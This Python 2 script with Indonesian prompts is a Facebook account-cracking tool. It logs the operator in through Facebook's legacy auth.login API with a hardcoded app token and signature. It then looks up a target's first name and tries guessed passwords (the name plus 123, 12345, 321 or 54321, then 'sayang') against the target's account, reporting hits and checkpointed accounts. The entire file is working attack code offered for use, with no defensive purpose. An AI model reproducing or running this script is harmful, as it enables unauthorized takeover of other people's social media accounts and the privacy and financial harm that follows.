import os
import sys
import time
import json
import urllib
import requests

try:
        import requests
except ImportError:
        os.system("pip2 install requests")

def login():
        try:
                token = open("token.txt", "r")
        
        except IOError:
                print
                print "================================"
                user_name = raw_input(" Masukkan Username: ")
                password = raw_input(" Masukkan Password: ")
                print "================================"
                urldev = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user_name+'&locale=en_US&password='+password+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                dev = urldev.content
                jsl = json.loads(dev)
                if "session_key" in dev:
                        print " Login sukses..."
                        open("token.txt", "w").write(jsl["access_token"])
                        brutefor()

                elif "www.facebook.com" in jsl["error_msg"]:
                        print " Akun Kena Cekpoint..."

                else:
                        print " Login gagal..."
                        
        else:
                brutefor()
                


def brutefor():
        try:
                token = open("token.txt", "r").read()

        except IOError:
                os.system("rm -f token.txt")

        else:
                print
                print " ===================================="
                target = raw_input(" [#] Masukan ID Target: ")
                print " ===================================="
                urldev = requests.get('https://graph.facebook.com/' + target + '?access_token=' + token)
                jsl = json.loads(urldev.text)

                pas1 = jsl["first_name"] + "123"
                print " [+] " + pas1
                dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + pas1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                js = json.load(dev)
                if "access_token" in js:
                        print " Found : " + pas1
                elif "www.facebook" in js["error_msg"]:
                        print " Cekpoint : " + pas1
                else:
                        pas2 = jsl["first_name"] + "12345"
                        print " [+] " + pas2
                        dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + pas2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        js = json.load(dev)
                        if "access_token" in js:
                                print " Found : " + pas2
                        elif "www.facebook.com" in js["error_msg"]:
                                print " Cekpoint :" + pas2
                        else:
                                san3 = jsl["first_name"] + "321"
                                print " [+] " + san3
                                dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                js = json.load(dev)
                                if "access_token" in js:
                                        print " Found : " + san3
                                elif "www.facebook.com" in js["error_msg"]:
                                        print " Cekpoint : " + san3
                                else:
                                        san4 = jsl["first_name"] + "54321"
                                        print " [+] " + san4
                                        dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        js = json.load(dev)
                                        if "access_token" in js:
                                                print " Found : " + san4
                                        elif "www.facebook.com" in js["error_msg"]:
                                                print " Cekpoint : " + san4
                                        else:
                                                san5 = "sayang"
                                                print " [+] " + san5
                                                dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                js = json.load(dev)
                                                if "access_token" in js:
                                                        print " Found : " + san5
                                                elif "www.facebook.com" in js["error_msg"]:
                                                        print " Cekpoint : " + san5
                                                else:
                                                        print " Tak Ada Yg Cocok.."

def main():
        login()

if __name__=="__main__":
        main()
